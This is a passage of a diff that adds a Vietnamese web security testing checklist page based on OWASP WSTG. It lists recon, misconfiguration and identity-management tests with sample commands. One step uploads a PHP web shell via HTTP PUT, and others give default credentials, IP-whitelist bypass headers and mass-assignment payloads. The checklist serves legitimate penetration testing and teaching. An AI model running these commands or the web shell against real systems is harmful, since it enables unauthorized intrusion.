@@ -1,0 +1,1635 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Danh Sách Kiểm Tra Bảo Mật Ứng Dụng Web (Web Application Security Testing Checklist)</title>
+<style>
+:root{
+  --bg:#0f1419;
+  --bg-2:#161b22;
+  --bg-3:#1c232c;
+  --text:#e6edf3;
+  --text-dim:#9ba8b6;
+  --accent:#58a6ff;
+  --accent-2:#7ee787;
+  --warn:#f0883e;
+  --danger:#ff7b72;
+  --border:#30363d;
+  --card:#161b22;
+  --code-bg:#0d1117;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;line-height:1.65;font-size:15px}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* Layout */
+.layout{display:grid;grid-template-columns:300px 1fr;min-height:100vh}
+@media(max-width:900px){.layout{grid-template-columns:1fr}.sidebar{position:static!important;height:auto!important}}
+
+/* Sidebar */
+.sidebar{position:sticky;top:0;height:100vh;overflow-y:auto;background:var(--bg-2);border-right:1px solid var(--border);padding:24px 18px}
+.sidebar h2{font-size:18px;margin-bottom:8px;color:var(--accent-2)}
+.sidebar .subtitle{font-size:12px;color:var(--text-dim);margin-bottom:18px}
+.sidebar ol{list-style:none;padding:0}
+.sidebar ol li{margin:4px 0}
+.sidebar ol li a{display:block;padding:7px 10px;border-radius:6px;color:var(--text-dim);font-size:13.5px;border-left:3px solid transparent}
+.sidebar ol li a:hover{background:var(--bg-3);color:var(--text);text-decoration:none;border-left-color:var(--accent)}
+.sidebar ol li a.active{background:var(--bg-3);color:var(--accent);border-left-color:var(--accent)}
+
+/* Search */
+.search-box{margin-bottom:18px}
+.search-box input{width:100%;padding:9px 12px;background:var(--bg-3);border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:13px;outline:none}
+.search-box input:focus{border-color:var(--accent)}
+
+/* Progress */
+.progress-card{background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:16px}
+.progress-card .label{font-size:12px;color:var(--text-dim);margin-bottom:6px}
+.progress-bar{height:8px;background:var(--bg);border-radius:4px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent-2));width:0%;transition:width .3s}
+.progress-text{font-size:11px;color:var(--text-dim);margin-top:6px;text-align:right}
+
+/* Main content */
+.main{padding:40px 60px;max-width:1100px}
+@media(max-width:900px){.main{padding:24px 18px}}
+
+.hero{margin-bottom:40px;padding-bottom:24px;border-bottom:1px solid var(--border)}
+.hero h1{font-size:32px;margin-bottom:10px;color:var(--text)}
+.hero p{color:var(--text-dim);font-size:15px;margin-bottom:8px}
+.hero .meta{display:flex;gap:14px;flex-wrap:wrap;margin-top:14px}
+.hero .meta span{font-size:12px;background:var(--bg-3);padding:5px 10px;border-radius:4px;border:1px solid var(--border);color:var(--text-dim)}
+
+section.category{margin-bottom:48px;scroll-margin-top:20px}
+section.category > h2{font-size:24px;color:var(--accent-2);padding-bottom:10px;border-bottom:2px solid var(--border);margin-bottom:6px}
+section.category > .cat-id{font-size:12px;color:var(--text-dim);margin-bottom:14px;font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
+section.category > .cat-desc{color:var(--text-dim);margin-bottom:24px;font-size:14.5px;background:var(--bg-2);border-left:3px solid var(--accent);padding:12px 16px;border-radius:0 6px 6px 0}
+
+.item{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:20px 22px;margin-bottom:14px;transition:border-color .2s}
+.item:hover{border-color:var(--accent)}
+.item.checked{opacity:.65;border-color:var(--accent-2)}
+.item-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:10px}
+.item-header input[type=checkbox]{width:20px;height:20px;margin-top:3px;cursor:pointer;accent-color:var(--accent-2);flex-shrink:0}
+.item-header .h-text{flex:1}
+.item-header h3{font-size:17px;color:var(--text);margin-bottom:4px}
+.item-header .item-id{font-size:11px;color:var(--text-dim);font-family:ui-monospace,SFMono-Regular,Consolas,monospace;background:var(--bg);padding:2px 8px;border-radius:3px;display:inline-block;margin-right:8px}
+.item-header .severity{font-size:10px;padding:3px 8px;border-radius:3px;font-weight:600;display:inline-block;text-transform:uppercase;letter-spacing:.4px}
+.sev-critical{background:#7c1f1f;color:#ffb8b0}
+.sev-high{background:#693a1a;color:#ffc78c}
+.sev-medium{background:#5a4f1c;color:#ffe58a}
+.sev-low{background:#1d4d3a;color:#9aeac6}
+.sev-info{background:#1d3a5c;color:#9bc7ff}
+
+.item .body{padding-left:34px}
+.item .body h4{font-size:13px;color:var(--accent);margin-top:14px;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+.item .body p, .item .body ul, .item .body ol{font-size:14px;color:var(--text);margin-bottom:8px}
+.item .body ul, .item .body ol{padding-left:22px}
+.item .body li{margin-bottom:4px}
+.item .body code{background:var(--code-bg);padding:2px 6px;border-radius:3px;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:13px;color:var(--accent-2);border:1px solid var(--border)}
+.item .body pre{background:var(--code-bg);padding:12px 14px;border-radius:6px;overflow-x:auto;margin:8px 0;border:1px solid var(--border)}
+.item .body pre code{background:none;border:none;padding:0;font-size:12.5px;color:#c9d1d9}
+.item .body .tools{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
+.item .body .tools span{background:var(--bg-3);border:1px solid var(--border);padding:3px 9px;border-radius:12px;font-size:11.5px;color:var(--text-dim)}
+
+/* footer */
+footer{margin-top:60px;padding-top:24px;border-top:1px solid var(--border);color:var(--text-dim);font-size:12.5px;text-align:center}
+
+/* hidden state for search */
+.hidden{display:none!important}
+
+/* Buttons */
+.btn-row{display:flex;gap:8px;margin-bottom:14px}
+.btn{background:var(--bg-3);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:5px;font-size:12px;cursor:pointer;transition:all .2s}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.danger:hover{border-color:var(--danger);color:var(--danger)}
+</style>
+</head>
+<body>
+<div class="layout">
+  <aside class="sidebar">
+    <h2>Web Security</h2>
+    <div class="subtitle">Danh sách kiểm tra bảo mật web — phiên bản tiếng Việt</div>
+
+    <div class="search-box">
+      <input id="searchInput" type="text" placeholder="🔍 Tìm kiếm hạng mục..." />
+    </div>
+
+    <div class="progress-card">
+      <div class="label">Tiến độ kiểm tra</div>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      <div class="progress-text" id="progressText">0 / 0 (0%)</div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn" onclick="expandAll()">Mở rộng</button>
+      <button class="btn danger" onclick="resetAll()">Xóa tiến độ</button>
+    </div>
+
+    <ol id="navList"></ol>
+  </aside>
+
+  <main class="main">
+    <div class="hero">
+      <h1>🛡️ Danh Sách Kiểm Tra Bảo Mật Ứng Dụng Web</h1>
+      <p>Bộ tài liệu hướng dẫn kiểm thử bảo mật toàn diện cho website và web application. Được xây dựng dựa trên các tiêu chuẩn quốc tế: <strong>OWASP WSTG (Web Security Testing Guide) v4.2</strong>, <strong>OWASP Top 10 2021</strong>, <strong>OWASP ASVS</strong>, và <strong>NIST SP 800-115</strong>.</p>
+      <p>Mỗi hạng mục được trình bày chi tiết với: <em>mô tả lỗ hổng, mục đích kiểm tra, các bước thực hiện, payload mẫu, công cụ hỗ trợ và biện pháp phòng chống</em>. Tích vào ô bên cạnh để theo dõi tiến độ — dữ liệu được lưu trong trình duyệt của bạn.</p>
+      <div class="meta">
+        <span>📅 Cập nhật: 2026</span>
+        <span>📚 Dựa trên: OWASP WSTG v4.2</span>
+        <span>🎯 Đối tượng: Pentester, Developer, QA Security</span>
+        <span>⚠️ Chỉ kiểm thử trên hệ thống được phép</span>
+      </div>
+    </div>
+
+    <div id="content"></div>
+
+    <footer>
+      <p>Tài liệu này chỉ dùng cho mục đích kiểm thử bảo mật hợp pháp và giáo dục. Mọi hành vi truy cập trái phép vào hệ thống không được sự cho phép đều vi phạm pháp luật.</p>
+      <p style="margin-top:8px">Tham khảo thêm: <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP WSTG</a> · <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a> · <a href="https://owasp.org/www-project-application-security-verification-standard/" target="_blank">OWASP ASVS</a></p>
+    </footer>
+  </main>
+</div>
+
+<script>
+// ==================== DATA ====================
+const CATEGORIES = [
+  {
+    id: "info-gathering",
+    code: "WSTG-INFO",
+    title: "1. Thu thập thông tin (Information Gathering)",
+    desc: "Giai đoạn trinh sát thụ động và chủ động nhằm thu thập tối đa thông tin về mục tiêu: công nghệ sử dụng, kiến trúc hệ thống, các điểm vào (entry point), thông tin lộ lọt từ tìm kiếm Google, mã nguồn, metadata. Đây là nền tảng cho toàn bộ quá trình kiểm thử về sau — càng nhiều thông tin càng dễ phát hiện lỗ hổng.",
+    items: [
+      {
+        id:"INFO-001", sev:"info", title:"Trinh sát thụ động qua công cụ tìm kiếm (Search Engine Recon)",
+        desc:"Sử dụng các công cụ tìm kiếm (Google, Bing, DuckDuckGo, Shodan) để khám phá thông tin nhạy cảm về ứng dụng đã bị đánh chỉ mục mà không cần tương tác trực tiếp với máy chủ. Mục đích là phát hiện file nhạy cảm bị lộ, trang quản trị, thông tin cấu hình, lỗi hiển thị stack trace, mã nguồn để lộ trên GitHub.",
+        steps:[
+          "Áp dụng Google Dorks: <code>site:target.com filetype:pdf</code>, <code>site:target.com inurl:admin</code>, <code>site:target.com intitle:\"index of\"</code>",
+          "Tìm file nhạy cảm: <code>filetype:env</code>, <code>filetype:sql</code>, <code>filetype:bak</code>, <code>filetype:log</code>, <code>filetype:config</code>",
+          "Tìm thông báo lỗi: <code>site:target.com \"sql syntax\" OR \"warning: mysql\"</code>",
+          "Kiểm tra Shodan và Censys với domain/IP để phát hiện cổng mở, dịch vụ chạy, banner",
+          "Tìm kiếm trên GitHub/GitLab: <code>org:target-org password</code>, <code>target.com api_key</code>",
+          "Kiểm tra Wayback Machine (web.archive.org) để xem các phiên bản cũ của trang"
+        ],
+        tools:["Google Dorks","Shodan","Censys","GitHub Search","Wayback Machine","theHarvester","Maltego"]
+      },
+      {
+        id:"INFO-002", sev:"info", title:"Phát hiện máy chủ web và phiên bản (Web Server Fingerprinting)",
+        desc:"Xác định loại web server (Apache, Nginx, IIS, LiteSpeed...), phiên bản chính xác, và các module được cài đặt. Thông tin này giúp tra cứu các CVE đã biết và lập kế hoạch khai thác cụ thể cho phiên bản đó.",
+        steps:[
+          "Phân tích HTTP response header: <code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>",
+          "Sử dụng <code>curl -I https://target.com</code> để xem header",
+          "Sử dụng nmap với script: <code>nmap -sV -p 80,443 --script=http-server-header target.com</code>",
+          "Sử dụng whatweb: <code>whatweb -a 3 https://target.com</code>",
+          "Sử dụng wappalyzer (extension hoặc CLI) để nhận diện CMS, framework, thư viện JS",
+          "Quan sát trang lỗi 404, 500 mặc định — chúng thường tiết lộ phiên bản",
+          "Kiểm tra HTTP method bất thường: <code>OPTIONS</code> trả về danh sách method được hỗ trợ"
+        ],
+        tools:["curl","nmap","whatweb","wappalyzer","httprint","Nikto","BuiltWith"]
+      },
+      {
+        id:"INFO-003", sev:"low", title:"Kiểm tra metadata và file lộ thông tin",
+        desc:"Tìm và phân tích các file công khai có thể tiết lộ cấu trúc nội bộ của ứng dụng: <code>robots.txt</code>, <code>sitemap.xml</code>, <code>security.txt</code>, <code>.well-known/</code>, <code>humans.txt</code>, <code>crossdomain.xml</code>, <code>clientaccesspolicy.xml</code>. Các file này có thể chứa đường dẫn đến tài nguyên ẩn, API endpoint, hoặc trang quản trị mà nhà phát triển cố tình giấu khỏi crawler nhưng vẫn để lộ trong file này.",
+        steps:[
+          "Truy cập <code>https://target.com/robots.txt</code> — chú ý các <code>Disallow</code> entry vì đây có thể là trang nhạy cảm",
+          "Truy cập <code>https://target.com/sitemap.xml</code> để liệt kê toàn bộ URL được tự khai báo",
+          "Kiểm tra <code>https://target.com/.well-known/security.txt</code>",
+          "Kiểm tra metadata trong file công khai (PDF, DOCX, JPG): tên tác giả, software, đường dẫn nội bộ",
+          "Sử dụng <code>exiftool</code> để trích xuất metadata: <code>exiftool file.pdf</code>",
+          "Sử dụng <code>FOCA</code> hoặc <code>metagoofil</code> để tự động hóa"
+        ],
+        tools:["exiftool","FOCA","metagoofil","strings","binwalk"]
+      },
+      {
+        id:"INFO-004", sev:"medium", title:"Liệt kê ứng dụng trên cùng máy chủ (Virtual Host Enumeration)",
+        desc:"Một địa chỉ IP có thể host nhiều domain (virtual hosting). Việc liệt kê tất cả các vhost giúp phát hiện các site liên quan, môi trường staging/dev/test thường có bảo mật yếu hơn production.",
+        steps:[
+          "Sử dụng reverse DNS lookup, công cụ như <code>dnsdumpster.com</code>, <code>securitytrails.com</code>",
+          "Brute force vhost với <code>gobuster vhost</code>: <code>gobuster vhost -u https://target.com -w wordlist.txt</code>",
+          "Sử dụng <code>ffuf</code>: <code>ffuf -u https://IP -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs 4242</code>",
+          "Kiểm tra SSL certificate transparency log: <code>crt.sh</code>",
+          "Sử dụng Censys/Shodan với truy vấn IP để liệt kê hostname"
+        ],
+        tools:["gobuster","ffuf","dnsdumpster","crt.sh","Sublist3r","amass","subfinder"]
+      },
+      {
+        id:"INFO-005", sev:"medium", title:"Liệt kê subdomain (Subdomain Enumeration)",
+        desc:"Phát hiện toàn bộ subdomain của một tổ chức là bước thiết yếu để mở rộng bề mặt tấn công. Subdomain dev/staging/test thường có lỗ hổng nghiêm trọng do không được kiểm thử kỹ. Dùng cả phương pháp passive (truy vấn dữ liệu công khai) và active (DNS brute force).",
+        steps:[
+          "Passive: <code>subfinder -d target.com</code>, <code>amass enum -passive -d target.com</code>",
+          "Active brute force: <code>amass enum -active -d target.com -brute -w subdomains.txt</code>",
+          "Kiểm tra SSL Certificate Transparency: <code>https://crt.sh/?q=%25.target.com</code>",
+          "DNS zone transfer: <code>dig axfr @ns1.target.com target.com</code>",
+          "Permutation/altdns: tạo các biến thể từ subdomain đã biết",
+          "Kiểm tra subdomain takeover: subdomain trỏ đến dịch vụ bên thứ ba (S3, Heroku, GitHub Pages) đã bị xóa nhưng record DNS vẫn còn"
+        ],
+        tools:["subfinder","amass","sublist3r","assetfinder","crt.sh","altdns","Subjack","SubOver"]
+      },
+      {
+        id:"INFO-006", sev:"medium", title:"Khám phá các điểm vào ứng dụng (Application Entry Points)",
+        desc:"Lập bản đồ tất cả các điểm tương tác với ứng dụng: form, AJAX endpoint, REST/GraphQL API, WebSocket, header tùy chỉnh, parameter URL, cookie. Đây là cơ sở dữ liệu quan trọng để kiểm thử input validation và authorization.",
+        steps:[
+          "Duyệt thủ công toàn bộ ứng dụng với Burp Suite proxy bật để ghi lại request",
+          "Sử dụng spider/crawler: Burp Spider, OWASP ZAP Spider, <code>katana</code>",
+          "Phân tích JavaScript file để tìm endpoint ẩn: <code>linkfinder</code>, <code>secretfinder</code>",
+          "Liệt kê parameter: <code>arjun -u https://target.com/api</code>",
+          "Phân tích traffic mobile/desktop app nếu có",
+          "Tìm endpoint từ Wayback Machine: <code>waybackurls target.com</code>, <code>gau target.com</code>"
+        ],
+        tools:["Burp Suite","OWASP ZAP","katana","linkfinder","arjun","waybackurls","gau","hakrawler"]
+      },
+      {
+        id:"INFO-007", sev:"low", title:"Nhận diện framework và CMS",
+        desc:"Xác định framework backend (Laravel, Django, Spring, Express...) và CMS (WordPress, Drupal, Joomla...). Mỗi framework có pattern URL, cấu trúc thư mục, header và lỗ hổng đặc trưng riêng.",
+        steps:[
+          "Quan sát URL pattern: <code>/wp-admin/</code> (WordPress), <code>/administrator/</code> (Joomla), <code>/user/login</code> (Drupal)",
+          "Kiểm tra tệp đặc trưng: <code>/wp-login.php</code>, <code>/readme.html</code>, <code>/CHANGELOG.txt</code>",
+          "Header HTTP: <code>X-Generator</code>, <code>X-Drupal-Cache</code>, <code>Set-Cookie</code> (laravel_session, csrftoken)",
+          "Sử dụng <code>wpscan</code> cho WordPress, <code>droopescan</code> cho Drupal/Joomla",
+          "Kiểm tra phiên bản chính xác qua hash file static (CSS, JS) đã biết"
+        ],
+        tools:["wpscan","droopescan","CMSeek","wappalyzer","whatweb","retire.js"]
+      },
+      {
+        id:"INFO-008", sev:"info", title:"Lập bản đồ kiến trúc ứng dụng",
+        desc:"Hiểu kiến trúc tổng thể: monolith hay microservice, vị trí WAF/CDN/Load Balancer, backend service, database, hệ thống xác thực (SSO, OAuth), CDN sử dụng. Giúp lựa chọn vector tấn công phù hợp và bypass các lớp bảo vệ.",
+        steps:[
+          "Phân tích DNS record: A, AAAA, MX, TXT, NS, CNAME",
+          "Trace route: <code>traceroute target.com</code>",
+          "Kiểm tra CDN: header <code>Server: cloudflare</code>, <code>X-Cache</code>, <code>Via</code>",
+          "Phát hiện WAF: <code>wafw00f https://target.com</code>",
+          "Phân tích cookie để nhận diện load balancer (session affinity)",
+          "Tìm IP gốc backend phía sau CDN qua: subdomain leak, certificate transparency, email header"
+        ],
+        tools:["wafw00f","dig","traceroute","CloudFail","CrimeFlare"]
+      }
+    ]
+  },
+  {
+    id:"config-mgmt",
+    code:"WSTG-CONF",
+    title:"2. Kiểm thử quản lý cấu hình & triển khai (Configuration & Deployment Management)",
+    desc:"Đánh giá cách hệ thống được cấu hình và triển khai. Sai sót cấu hình (security misconfiguration) là một trong những nguyên nhân hàng đầu của các vụ rò rỉ dữ liệu. Bao gồm: cấu hình mặc định nguy hiểm, file backup, debug mode, header bảo mật thiếu, phương thức HTTP nguy hiểm, quyền truy cập file.",
+    items:[
+      {
+        id:"CONF-001", sev:"high", title:"Kiểm thử cấu hình hạ tầng mạng (Network Infrastructure Configuration)",
+        desc:"Đánh giá cấu hình của các thành phần mạng quanh ứng dụng: firewall, IDS/IPS, reverse proxy, CDN. Kiểm tra cổng không cần thiết bị mở, dịch vụ debug bị bỏ quên, giao thức yếu (Telnet, FTP) còn được dùng.",
+        steps:[
+          "Quét cổng đầy đủ: <code>nmap -sS -sV -p- -T4 target.com</code>",
+          "Kiểm tra dịch vụ phụ trợ: SSH, FTP, SMTP, SMB, RDP, MongoDB, Redis, Elasticsearch không xác thực",
+          "Kiểm tra port quản trị: 8080, 8443, 9090, 10000 (Webmin), 7474 (Neo4j), 5601 (Kibana)",
+          "Kiểm tra cấu hình SSL/TLS với <code>testssl.sh https://target.com</code>",
+          "Phát hiện dịch vụ banner để lộ phiên bản"
+        ],
+        tools:["nmap","masscan","testssl.sh","sslyze","nessus"]
+      },
+      {
+        id:"CONF-002", sev:"high", title:"Kiểm thử cấu hình platform ứng dụng (Application Platform Configuration)",
+        desc:"Kiểm tra cấu hình mặc định nguy hiểm của ứng dụng/server: tài khoản admin mặc định (admin/admin), trang sample, console quản trị mở (Tomcat Manager, JBoss JMX, Jenkins script console), debug mode bật trên production.",
+        steps:[
+          "Truy cập đường dẫn quản trị mặc định: <code>/manager/html</code> (Tomcat), <code>/admin-console</code> (JBoss), <code>/console</code> (WebLogic), <code>/script</code> (Jenkins)",
+          "Thử credential mặc định: admin/admin, tomcat/tomcat, root/root, admin/password",
+          "Kiểm tra trang ví dụ/sample: <code>/examples/</code>, <code>/manager/example</code>, <code>/phpmyadmin/</code>",
+          "Phát hiện debug mode: stack trace hiển thị trong response, <code>?debug=true</code>, <code>X-Debug</code> header",
+          "Kiểm tra Spring Actuator: <code>/actuator/env</code>, <code>/actuator/heapdump</code>, <code>/actuator/mappings</code>"
+        ],
+        tools:["Burp Suite","gobuster","Nikto","Nuclei","SecLists wordlist"]
+      },
+      {
+        id:"CONF-003", sev:"high", title:"Kiểm thử file mở rộng nhạy cảm và file backup",
+        desc:"Tìm các file bị bỏ quên có thể chứa mã nguồn, thông tin cấu hình, mật khẩu: file backup (<code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>~</code>), file cấu hình (<code>.env</code>, <code>config.php</code>), file VCS (<code>.git/</code>, <code>.svn/</code>), file IDE (<code>.idea/</code>, <code>.vscode/</code>), database dump (<code>.sql</code>).",
+        steps:[
+          "Brute force tệp với wordlist phong phú: <code>ffuf -u https://target.com/FUZZ -w raft-medium-files.txt</code>",
+          "Thử biến thể của file đã biết: <code>index.php</code> → <code>index.php.bak</code>, <code>index.php~</code>, <code>index.php.swp</code>",
+          "Kiểm tra <code>.git/</code> exposed: <code>https://target.com/.git/HEAD</code> — nếu trả về thì dùng <code>git-dumper</code> để tải toàn bộ repo",
+          "Kiểm tra <code>.env</code>: <code>https://target.com/.env</code>",
+          "Tìm file dump database: <code>backup.sql</code>, <code>dump.sql</code>, <code>users.sql</code>"
+        ],
+        tools:["ffuf","gobuster","dirsearch","git-dumper","DotGitDownloader","Nuclei"]
+      },
+      {
+        id:"CONF-004", sev:"medium", title:"Liệt kê admin interface",
+        desc:"Tìm các giao diện quản trị ẩn không liên kết từ trang chủ. Đây là mục tiêu hàng đầu cho brute force và khai thác lỗ hổng quyền hạn.",
+        steps:[
+          "Brute force đường dẫn admin: <code>/admin</code>, <code>/administrator</code>, <code>/wp-admin</code>, <code>/manager</code>, <code>/console</code>, <code>/dashboard</code>, <code>/cp</code>",
+          "Sử dụng wordlist chuyên dụng: <code>SecLists/Discovery/Web-Content/AdminPanels.txt</code>",
+          "Thử subdomain quản trị: <code>admin.target.com</code>, <code>cms.target.com</code>, <code>panel.target.com</code>",
+          "Kiểm tra IP whitelist bypass: header <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP</code>, <code>X-Originating-IP</code>"
+        ],
+        tools:["dirsearch","gobuster","Burp Intruder","Nuclei admin templates"]
+      },
+      {
+        id:"CONF-005", sev:"high", title:"Kiểm thử phương thức HTTP nguy hiểm",
+        desc:"Một số HTTP method có thể bị lạm dụng nếu được kích hoạt không cần thiết: <code>PUT</code> (tải file lên), <code>DELETE</code> (xóa tài nguyên), <code>TRACE</code> (Cross-Site Tracing — XST), <code>CONNECT</code> (proxy), <code>PATCH</code>. Cần kiểm tra cả ở cấp độ web server và framework.",
+        steps:[
+          "Liệt kê method được hỗ trợ: <code>curl -X OPTIONS https://target.com -I</code>",
+          "Thử PUT để upload file: <code>curl -X PUT -d \"&lt;?php system($_GET['cmd']); ?&gt;\" https://target.com/shell.php</code>",
+          "Thử DELETE: <code>curl -X DELETE https://target.com/api/users/1</code>",
+          "Kiểm tra TRACE: <code>curl -X TRACE https://target.com -H \"X-Test: payload\"</code>",
+          "Method override: thử header <code>X-HTTP-Method-Override: PUT</code> hoặc <code>X-Method-Override</code>"
+        ],
+        tools:["curl","Burp Suite","nmap http-methods script"]
+      },
+      {
+        id:"CONF-006", sev:"high", title:"Kiểm thử HSTS (HTTP Strict Transport Security)",
+        desc:"HSTS buộc trình duyệt chỉ kết nối qua HTTPS, ngăn chặn tấn công SSL stripping. Header <code>Strict-Transport-Security</code> phải được cấu hình với max-age đủ lớn (≥ 31536000 = 1 năm), nên có <code>includeSubDomains</code> và <code>preload</code>.",
+        steps:[
+          "Kiểm tra header: <code>curl -I https://target.com | grep -i strict</code>",
+          "Đảm bảo HTTPS redirect HTTP: <code>curl -I http://target.com</code> → 301/302 → HTTPS",
+          "Kiểm tra trên https://hstspreload.org/",
+          "Đảm bảo cookie có flag <code>Secure</code> và <code>HttpOnly</code>"
+        ],
+        tools:["curl","testssl.sh","Mozilla Observatory"]
+      },
+      {
+        id:"CONF-007", sev:"medium", title:"Kiểm thử cross-domain policy (CORS)",
+        desc:"CORS (Cross-Origin Resource Sharing) nếu cấu hình sai có thể cho phép website độc hại đọc dữ liệu từ ứng dụng. Đặc biệt nguy hiểm khi <code>Access-Control-Allow-Origin: *</code> kết hợp với <code>Access-Control-Allow-Credentials: true</code>, hoặc reflected origin.",
+        steps:[
+          "Gửi request với header <code>Origin: https://evil.com</code> và xem response có chứa <code>Access-Control-Allow-Origin: https://evil.com</code> không",
+          "Kiểm tra null origin: <code>Origin: null</code>",
+          "Thử bypass với subdomain: <code>Origin: https://target.com.evil.com</code>",
+          "Thử regex bypass: <code>Origin: https://eviltarget.com</code> nếu chỉ check chứa <code>target.com</code>",
+          "Kiểm tra <code>Access-Control-Allow-Methods</code>, <code>Access-Control-Allow-Headers</code> không quá rộng",
+          "Kiểm tra crossdomain.xml và clientaccesspolicy.xml (Flash/Silverlight)"
+        ],
+        tools:["Burp Suite","CORScanner","Corsy","curl"]
+      },
+      {
+        id:"CONF-008", sev:"high", title:"Kiểm thử subdomain takeover",
+        desc:"Khi subdomain trỏ (CNAME) đến dịch vụ bên thứ ba (Heroku app, S3 bucket, GitHub Pages, Azure...) nhưng dịch vụ đó đã bị xóa, attacker có thể đăng ký lại để chiếm subdomain. Hậu quả: phishing dưới domain hợp pháp, đánh cắp cookie, vượt CORS.",
+        steps:[
+          "Liệt kê toàn bộ subdomain (xem INFO-005)",
+          "Kiểm tra CNAME của mỗi subdomain: <code>dig CNAME sub.target.com</code>",
+          "Phát hiện dấu hiệu takeover: trang trả về \"NoSuchBucket\", \"There isn't a GitHub Pages site here\", \"The specified bucket does not exist\"",
+          "Sử dụng <code>subjack</code>, <code>subover</code>, <code>nuclei</code> với template takeover"
+        ],
+        tools:["subjack","SubOver","nuclei","can-i-take-over-xyz"]
+      },
+      {
+        id:"CONF-009", sev:"medium", title:"Kiểm thử HTTP Security Headers",
+        desc:"Đánh giá các header bảo mật cần thiết: <code>Content-Security-Policy</code>, <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Referrer-Policy</code>, <code>Permissions-Policy</code>, <code>Strict-Transport-Security</code>. Thiếu hoặc cấu hình sai sẽ tạo điều kiện cho XSS, clickjacking, MIME sniffing.",
+        steps:[
+          "Quét tự động: <code>https://securityheaders.com/?q=target.com</code>",
+          "Kiểm tra CSP đủ chặt: không có <code>unsafe-inline</code>, <code>unsafe-eval</code>, <code>*</code>, <code>data:</code>",
+          "X-Frame-Options: <code>DENY</code> hoặc <code>SAMEORIGIN</code> để chống clickjacking",
+          "X-Content-Type-Options: <code>nosniff</code> để chống MIME sniffing",
+          "Referrer-Policy: <code>strict-origin-when-cross-origin</code> trở lên",
+          "Loại bỏ các header lộ thông tin: <code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>"
+        ],
+        tools:["securityheaders.com","Mozilla Observatory","csp-evaluator.withgoogle.com"]
+      }
+    ]
+  },
+  {
+    id:"identity",
+    code:"WSTG-IDNT",
+    title:"3. Kiểm thử quản lý danh tính (Identity Management)",
+    desc:"Quản lý danh tính bao gồm: định nghĩa role, quy trình đăng ký tài khoản, chính sách username, ranh giới giữa các loại user. Lỗ hổng ở tầng này dẫn đến leo thang đặc quyền, account enumeration, account takeover.",
+    items:[
+      {
+        id:"IDNT-001", sev:"medium", title:"Kiểm thử định nghĩa Role (Role Definitions)",
+        desc:"Xác định toàn bộ vai trò trong hệ thống (admin, manager, user, guest, premium...) và quyền hạn tương ứng. Kiểm tra xem có role không cần thiết, role với quyền quá rộng (over-privileged), hay role có thể bypass được không.",
+        steps:[
+          "Tạo tài khoản với mỗi role và lập ma trận quyền (role-permission matrix)",
+          "Kiểm tra mỗi endpoint với từng role để xác định ranh giới đúng",
+          "Tìm endpoint không kiểm tra role (chỉ kiểm tra authentication)",
+          "Xem có role ẩn (debug, system, internal) có thể truy cập qua thao tác đặc biệt không"
+        ],
+        tools:["Burp Suite Autorize","AuthMatrix","manual testing"]
+      },
+      {
+        id:"IDNT-002", sev:"high", title:"Kiểm thử quy trình đăng ký user",
+        desc:"Đánh giá quy trình đăng ký: có yêu cầu xác thực email/SĐT không, có thể tạo nhiều tài khoản tự động không, có check tài khoản trùng không, có thể đăng ký với role cao hơn không.",
+        steps:[
+          "Thử đăng ký với email/username giống tài khoản đã có",
+          "Kiểm tra response message để phát hiện account enumeration (\"Email đã tồn tại\" vs \"Email không hợp lệ\")",
+          "Thử inject role parameter: <code>{\"username\":\"test\",\"role\":\"admin\"}</code>",
+          "Kiểm tra mass assignment: thêm field <code>is_admin=true</code>, <code>verified=true</code>, <code>balance=999999</code>",
+          "Kiểm tra rate limit khi đăng ký (chống tạo tài khoản hàng loạt)",
+          "Thử bypass yêu cầu xác thực email (truy cập trực tiếp endpoint kích hoạt)"
+        ],
+        tools:["Burp Suite","Burp Intruder","email tempmail"]
+      },
+      {
+        id:"IDNT-003", sev:"high", title:"Kiểm thử quy trình cấp phát tài khoản (Account Provisioning)",
+        desc:"Kiểm tra quy trình admin tạo tài khoản, gán quyền, vô hiệu hóa, xóa. Lỗ hổng có thể cho phép user thường tạo tài khoản admin hoặc thay đổi quyền của tài khoản khác.",
+        steps:[
+          "Tài khoản user thường có thể gọi endpoint tạo user (admin only) không?",
+          "Có thể chuyển giao quyền cho user khác không?",
+          "Khi user bị vô hiệu hóa, session/token có bị hủy ngay không?",
+          "Khi user bị xóa, dữ liệu liên quan có được dọn dẹp không?"
+        ],
+        tools:["Burp Suite","manual testing"]
+      },
+      {
+        id:"IDNT-004", sev:"medium", title:"Liệt kê tài khoản (Account Enumeration)",
+        desc:"Phát hiện cách hệ thống tiết lộ sự tồn tại của username/email qua các response khác nhau ở: form đăng nhập, đăng ký, quên mật khẩu, response time, header. Cho phép attacker xây danh sách user hợp lệ để brute force.",
+        steps:[
+          "So sánh response khi nhập username đúng vs sai (mật khẩu sai cả 2)",
+          "Quên mật khẩu: \"Email đã được gửi\" vs \"Email không tồn tại\"",
